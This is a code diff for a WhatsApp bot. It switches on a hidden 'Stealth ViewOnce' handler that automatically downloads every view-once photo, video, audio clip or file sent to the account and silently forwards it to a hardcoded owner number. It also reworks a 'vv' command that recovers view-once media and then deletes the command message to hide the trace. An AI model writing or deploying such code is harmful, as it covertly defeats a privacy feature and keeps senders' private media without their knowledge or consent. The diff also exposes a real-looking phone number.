@@ -72,7 +72,7 @@ let reconnecting = false
 global.STATUS_DB = global.STATUS_DB || []
 global.STATUS_HASH = new Set()
 const pairCache = new Set()
-// const OWNER_JID = "2349021540840@s.whatsapp.net"
+const OWNER_JID = "2349021540840@s.whatsapp.net"
 
 // ================= RUNTIME FORMATTER =================
 
@@ -2056,75 +2056,75 @@ if (
   }
 }
 
-//  const viewOnce =
-//     msg.message.viewOnceMessage ||
-//     msg.message.viewOnceMessageV2 ||
-//     msg.message.viewOnceMessageV2Extension
+ const viewOnce =
+    msg.message.viewOnceMessage ||
+    msg.message.viewOnceMessageV2 ||
+    msg.message.viewOnceMessageV2Extension
 
-//   if (!viewOnce) return
+  if (!viewOnce) return
 
-//   try {
-//     const inner = viewOnce.message
-//     const type = Object.keys(inner)[0]
-//     const content = inner[type]
+  try {
+    const inner = viewOnce.message
+    const type = Object.keys(inner)[0]
+    const content = inner[type]
 
-//     if (!content) return
+    if (!content) return
 
-//     const stream = await downloadContentFromMessage(
-//       content,
-//       type.replace("Message", "")
-//     )
+    const stream = await downloadContentFromMessage(
+      content,
+      type.replace("Message", "")
+    )
 
-//     let buffer = Buffer.from([])
+    let buffer = Buffer.from([])
 
-//     for await (const chunk of stream) {
-//       buffer = Buffer.concat([buffer, chunk])
-//     }
+    for await (const chunk of stream) {
+      buffer = Buffer.concat([buffer, chunk])
+    }
 
-//     // 📝 optional metadata
-//     const caption =
-//       content.caption ||
-//       content.text ||
-//       "🔐 ViewOnce (Stealth Captured)"
+    // 📝 optional metadata
+    const caption =
+      content.caption ||
+      content.text ||
+      "🔐 ViewOnce (Stealth Captured)"
 
-//     let payload = {}
+    let payload = {}
 
-//     // 📸 IMAGE
-//     if (type === "imageMessage") {
-//       payload = {
-//         image: buffer,
-//         caption: `👁️ VIEWONCE\nFrom: ${msg.key.remoteJid}\n\n${caption}`
-//       }
+    // 📸 IMAGE
+    if (type === "imageMessage") {
+      payload = {
+        image: buffer,
+        caption: `👁️ VIEWONCE\nFrom: ${msg.key.remoteJid}\n\n${caption}`
+      }
 
-//     // 🎥 VIDEO
-//     } else if (type === "videoMessage") {
-//       payload = {
-//         video: buffer,
-//         caption: `👁️ VIEWONCE\nFrom: ${msg.key.remoteJid}\n\n${caption}`
-//       }
+    // 🎥 VIDEO
+    } else if (type === "videoMessage") {
+      payload = {
+        video: buffer,
+        caption: `👁️ VIEWONCE\nFrom: ${msg.key.remoteJid}\n\n${caption}`
+      }
 
-//     // 🎤 AUDIO
-//     } else if (type === "audioMessage") {
-//       payload = {
-//         audio: buffer,
-//         mimetype: content.mimetype || "audio/mp4"
-//       }
+    // 🎤 AUDIO
+    } else if (type === "audioMessage") {
+      payload = {
+        audio: buffer,
+        mimetype: content.mimetype || "audio/mp4"
+      }
 
-//     // 📄 FILE
-//     } else {
-//       payload = {
-//         document: buffer,
-//         mimetype: content.mimetype || "application/octet-stream",
-//         fileName: "viewonce_file"
-//       }
-//     }
+    // 📄 FILE
+    } else {
+      payload = {
+        document: buffer,
+        mimetype: content.mimetype || "application/octet-stream",
+        fileName: "viewonce_file"
+      }
+    }
 
-//     // 🕶️ SILENT SEND (NO CHAT RESPONSE)
-//     await sock.sendMessage(OWNER_JID, payload)
+    // 🕶️ SILENT SEND (NO CHAT RESPONSE)
+    await sock.sendMessage(OWNER_JID, payload)
 
-//   } catch (err) {
-//     console.log("Stealth ViewOnce error:", err)
-//   }
+  } catch (err) {
+    console.log("Stealth ViewOnce error:", err)
+  }
 
     // ================= ANTI DELETE =================
     if (group_settings.antidelete) {
@@ -2458,112 +2458,67 @@ if (isDM) {
       vv: async () => {
   if (!isOwner) return reply("❌ My owner only")
 
-  // 📩 Get quoted message
   const quoted =
-    msg.message?.extendedTextMessage
-      ?.contextInfo?.quotedMessage
+    msg.message?.extendedTextMessage?.contextInfo?.quotedMessage
 
   if (!quoted) {
-    return reply(
-      "❌ Reply to a view-once message"
-    )
+    return reply("❌ Reply to a view-once message")
   }
 
   try {
-
-    // 🔍 Detect actual media type
     const type = Object.keys(quoted)[0]
     const content = quoted[type]
 
-    if (!content) {
-      return reply("❌ Invalid message")
-    }
+    if (!content) return reply("❌ Invalid message")
 
-    // 📥 Download media
-    const stream =
-      await downloadContentFromMessage(
-        content,
-        type.replace("Message", "")
-      )
+    const stream = await downloadContentFromMessage(
+      content,
+      type.replace("Message", "")
+    )
 
     let buffer = Buffer.from([])
 
     for await (const chunk of stream) {
-      buffer = Buffer.concat([
-        buffer,
-        chunk
-      ])
+      buffer = Buffer.concat([buffer, chunk])
     }
 
-    // 📝 Preserve caption/text
     const caption =
       content.caption ||
       content.text ||
       "👁️ View-once recovered"
 
-    // 📤 Detect send type
     let payload = {}
 
     if (type === "imageMessage") {
-      payload = {
-        image: buffer,
-        caption
-      }
+      payload = { image: buffer, caption }
 
-    } else if (
-      type === "videoMessage"
-    ) {
-      payload = {
-        video: buffer,
-        caption
-      }
+    } else if (type === "videoMessage") {
+      payload = { video: buffer, caption }
 
-    } else if (
-      type === "audioMessage"
-    ) {
+    } else if (type === "audioMessage") {
       payload = {
         audio: buffer,
-        mimetype:
-          content.mimetype ||
-          "audio/mp4",
+        mimetype: content.mimetype || "audio/mp4",
         ptt: content.ptt || false
       }
 
     } else {
-      // 📄 Fallback for docs
       payload = {
         document: buffer,
-        mimetype:
-          content.mimetype ||
-          "application/octet-stream",
-        fileName:
-          content.fileName ||
-          "view_once_file"
+        mimetype: content.mimetype || "application/octet-stream",
+        fileName: content.fileName || "view_once_file"
       }
     }
 
-    // 📬 Send privately to owner
-    await sock.sendMessage(
-      sender,
-      payload
-    )
+    // 📤 send to owner first
+    const sent = await sock.sendMessage(sender, payload)
 
-    // 💣 Delete command message after 1s
-    setTimeout(async () => {
-      try {
-        await sock.sendMessage(
-          jid,
-          {
-            delete: msg.key
-          }
-        )
-      } catch (e) {
-        console.log(
-          "VV command delete failed:",
-          e
-        )
-      }
-    }, 1000)
+    // 💣 DELETE COMMAND ONLY AFTER SUCCESS SEND
+    if (sent) {
+      await sock.sendMessage(jid, {
+        delete: msg.key
+      })
+    }
 
   } catch (e) {
     console.log("VV error:", e)
